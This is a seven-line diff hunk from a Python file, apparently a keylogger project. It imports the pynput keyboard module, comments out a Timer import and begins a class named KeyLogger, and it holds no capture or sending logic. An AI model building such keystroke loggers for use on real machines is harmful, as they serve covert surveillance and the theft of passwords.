@@ -1,7 +1,7 @@
 import pynput
 from pynput import keyboard
 from datetime import datetime
-from threading import Timer
+#from threading import Timer
 
 
 class KeyLogger:
